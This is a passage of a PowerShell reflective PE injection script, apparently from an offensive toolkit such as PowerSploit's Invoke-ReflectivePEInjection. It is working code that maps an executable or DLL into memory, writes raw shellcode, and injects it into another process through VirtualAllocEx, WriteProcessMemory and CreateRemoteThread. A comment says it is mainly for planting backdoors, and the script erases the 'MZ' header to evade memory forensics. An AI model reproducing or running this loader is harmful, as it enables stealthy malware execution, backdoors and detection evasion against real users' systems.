			    #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			    #	call ExitThread
			    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			    Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			    $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    }
		    #################################################

		    Write-Output $ReturnArray
	    }
	
	
	    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	    #	It copies Count bytes from Source to Destination.
	    Function Copy-ArrayOfMemAddresses
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Array[]]
		    $CopyInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )

		    [UInt32]$OldProtectFlag = 0
		    foreach ($Info in $CopyInfo)
		    {
			    $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Call to VirtualProtect failed"
			    }
			
			    $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			    $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    }
	    }


	    #####################################
	    ##########    FUNCTIONS   ###########
	    #####################################
	    Function Get-MemoryProcAddress
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [String]
		    $FunctionName
		    )
		
		    $Win32Types = Get-Win32Types
		    $Win32Constants = Get-Win32Constants
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		    #Get the export table
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		    {
			    return [IntPtr]::Zero
		    }
		    $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		    $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		    for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		    {
			    #AddressOfNames is an array of pointers to strings of the names of the functions exported
			    $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			    $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			    $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			    if ($Name -ceq $FunctionName)
			    {
				    #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				    #    which contains the offset of the function in to the DLL
				    $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				    $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				    $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				    $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				    return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			    }
		    }
		
		    return [IntPtr]::Zero
	    }


	    Function Invoke-MemoryLoadLibrary
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true )]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $false)]
		    [String]
		    $ExeArgs,
		
		    [Parameter(Position = 2, Mandatory = $false)]
		    [IntPtr]
		    $RemoteProcHandle
		    )
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		    #Get Win32 constants and functions
		    $Win32Constants = Get-Win32Constants
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		
		    $RemoteLoading = $false
		    if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		    {
			    $RemoteLoading = $true
		    }
		
		    #Get basic PE information
		    Write-Verbose "Getting basic PE information from the file"
		    $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		    $OriginalImageBase = $PEInfo.OriginalImageBase
		    $NXCompatible = $true
		    if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		    {
			    Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			    $NXCompatible = $false
		    }
		
		
		    #Verify that the PE and the current process are the same bits (32bit or 64bit)
		    $Process64Bit = $true
		    if ($RemoteLoading -eq $true)
		    {
			    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			    $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			    if ($Result -eq [IntPtr]::Zero)
			    {
				    Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			    }
			
			    [Bool]$Wow64Process = $false
			    $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			    if ($Success -eq $false)
			    {
				    Throw "Call to IsWow64Process failed"
			    }
			
			    if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			    {
				    $Process64Bit = $false
			    }
			
			    #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			    $PowerShell64Bit = $true
			    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			    {
				    $PowerShell64Bit = $false
			    }
			    if ($PowerShell64Bit -ne $Process64Bit)
			    {
				    throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			    }
		    }
		    else
		    {
			    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			    {
				    $Process64Bit = $false
			    }
		    }
		    if ($Process64Bit -ne $PEInfo.PE64Bit)
		    {
			    Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		    }
		

		    #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		    Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		    [IntPtr]$LoadAddr = [IntPtr]::Zero
		    if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		    {
			    Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			    [IntPtr]$LoadAddr = $OriginalImageBase
		    }

		    $PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		    $EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		    if ($RemoteLoading -eq $true)
		    {
			    #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			    $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			    #todo, error handling needs to delete this memory if an error happens along the way
			    $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    if ($EffectivePEHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			    }
		    }
		    else
		    {
			    if ($NXCompatible -eq $true)
			    {
				    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			    }
			    else
			    {
				    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    }
			    $EffectivePEHandle = $PEHandle
		    }
		
		    [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		    if ($PEHandle -eq [IntPtr]::Zero)
		    { 
			    Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		    }		
		    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		    #Now that the PE is in memory, get more detailed information about it
		    Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		    $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		    $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		    Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		    #Copy each section from the PE in to memory
		    Write-Verbose "Copy PE sections in to memory"
		    Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		    #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		    Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		    Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		    #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		    Write-Verbose "Import DLL's needed by the PE we are loading"
		    if ($RemoteLoading -eq $true)
		    {
			    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		    }
		    else
		    {
			    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		    }
		
		
		    #Update the memory protection flags for all the memory just allocated
		    if ($RemoteLoading -eq $false)
		    {
			    if ($NXCompatible -eq $true)
			    {
				    Write-Verbose "Update memory protection flags"
				    Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			    }
			    else
			    {
				    Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			    }
		    }
		    else
		    {
			    Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		    }
		
		
		    #If remote loading, copy the DLL in to remote process memory
		    if ($RemoteLoading -eq $true)
		    {
			    [UInt32]$NumBytesWritten = 0
			    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			    if ($Success -eq $false)
			    {
				    Throw "Unable to write shellcode to remote process memory."
			    }
		    }
		
		
		    #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		    if ($PEInfo.FileType -ieq "DLL")
		    {
			    if ($RemoteLoading -eq $false)
			    {
				    Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				    $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			    }
			    else
			    {
				    $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				    if ($PEInfo.PE64Bit -eq $true)
				    {
					    #Shellcode: CallDllMain.asm
					    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				    }
				    else
				    {
					    #Shellcode: CallDllMain.asm
					    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				    }
				    $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				    $SCPSMemOriginal = $SCPSMem
				
				    Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				    Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				    Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				    if ($RSCAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Unable to allocate memory in the remote process for shellcode"
				    }
				
				    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				    {
					    Throw "Unable to write shellcode to remote process memory."
				    }

				    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				    if ($Result -ne 0)
				    {
					    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				    }
				
				    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			    }
		    }
		    elseif ($PEInfo.FileType -ieq "EXE")
		    {
			    #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			    [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			    [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			    $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			    #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			    #	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			    [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			    Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			    $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			    while($true)
			    {
				    [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				    if ($ThreadDone -eq 1)
				    {
					    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					    Write-Verbose "EXE thread has completed."
					    break
				    }
				    else
				    {
					    Start-Sleep -Seconds 1
				    }
			    }
		    }
		
		    return @($PEInfo.PEHandle, $EffectivePEHandle)
	    }
	
	
	    Function Invoke-MemoryFreeLibrary
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $PEHandle
		    )
		
		    #Get Win32 constants and functions
		    $Win32Constants = Get-Win32Constants
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		    #Call FreeLibrary for all the imports of the DLL
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		    {
			    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			    while ($true)
			    {
				    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				    #If the structure is null, it signals that this is the end of the array
				    if ($ImportDescriptor.Characteristics -eq 0 `
						    -and $ImportDescriptor.FirstThunk -eq 0 `
						    -and $ImportDescriptor.ForwarderChain -eq 0 `
						    -and $ImportDescriptor.Name -eq 0 `
						    -and $ImportDescriptor.TimeDateStamp -eq 0)
				    {
					    Write-Verbose "Done unloading the libraries needed by the PE"
					    break
				    }

				    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				    $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				    if ($ImportDllHandle -eq $null)
				    {
					    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				    }
				
				    $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				    if ($Success -eq $false)
				    {
					    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				    }
				
				    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			    }
		    }
		
		    #Call DllMain with process detach
		    Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		    $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		    if ($Success -eq $false)
		    {
			    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		    }
	    }


	    Function Main
	    {
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		    $Win32Constants =  Get-Win32Constants
		
		    $RemoteProcHandle = [IntPtr]::Zero
	
		    #If a remote process to inject in to is specified, get a handle to it
		    if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		    {
			    Throw "Can't supply a ProcId and ProcName, choose one or the other"
		    }
		    elseif ($ProcName -ne $null -and $ProcName -ne "")
		    {
			    $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			    if ($Processes.Count -eq 0)
			    {
				    Throw "Can't find process $ProcName"
			    }
			    elseif ($Processes.Count -gt 1)
			    {
				    $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				    Write-Output $ProcInfo
				    Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			    }
			    else
			    {
				    $ProcId = $Processes[0].ID
			    }
		    }
		
		    #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		    #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
    #		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
    #		{
    #			Write-Verbose "Getting SeDebugPrivilege"
    #			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
    #		}	
		
		    if (($ProcId -ne $null) -and ($ProcId -ne 0))
		    {
			    $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			    if ($RemoteProcHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Couldn't obtain the handle for process ID: $ProcId"
			    }
			
			    Write-Verbose "Got the handle for the remote process to inject in to"
		    }
		

		    #Load the PE reflectively
		    Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		    $PEHandle = [IntPtr]::Zero
		    if ($RemoteProcHandle -eq [IntPtr]::Zero)
		    {
			    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		    }
		    else
		    {
			    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		    }
		    if ($PELoadedInfo -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to load PE, handle returned is NULL"
		    }
		
		    $PEHandle = $PELoadedInfo[0]
		    $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		    #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		    if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		    {
			    #########################################
			    ### YOUR CODE GOES HERE
			    #########################################
	            switch ($FuncReturnType)
	            {
	                'WString' {
	                    Write-Verbose "Calling function with WString return type"
				        [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				        if ($WStringFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				        $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				        [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
	                }

	                'String' {
	                    Write-Verbose "Calling function with String return type"
				        [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				        if ($StringFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				        $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				        [IntPtr]$OutputPtr = $StringFunc.Invoke()
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				        Write-Output $Output
	                }

	                'Void' {
	                    Write-Verbose "Calling function with Void return type"
				        [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				        if ($VoidFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $VoidFuncDelegate = Get-DelegateType @() ([Void])
				        $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				        $VoidFunc.Invoke() | Out-Null
	                }
	            }
			    #########################################
			    ### END OF YOUR CODE
			    #########################################
		    }
		    #For remote DLL injection, call a void function which takes no parameters
		    elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		    {
			    $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			    if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			    {
				    Throw "VoidFunc couldn't be found in the DLL"
			    }
			
			    $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			    $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			    #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		    }
		
		    #Don't free a library if it is injected in a remote process
		    if ($RemoteProcHandle -eq [IntPtr]::Zero)
		    {
			    Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		    }
		    else
		    {
			    #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			    if ($Success -eq $false)
			    {
				    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			    }
		    }
		
		    Write-Verbose "Done!"
	    }

	    Main
    }

    #Main function to either run the script locally or remotely
    Function Main
    {
	    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	    {
		    $DebugPreference  = "Continue"
	    }
	
	    Write-Verbose "PowerShell ProcessID: $PID"
	
	    [Byte[]]$PEBytes = $null
	
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            $PEBytes = $Bytes64
        }
        else
        {
            $PEBytes = $Bytes32
        }
	
	    #Verify the image is a valid PE file
	    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

        if ($e_magic -ne 'MZ')
        {
            throw 'PE is not a valid PE file.'
        }

        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
	    # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
	
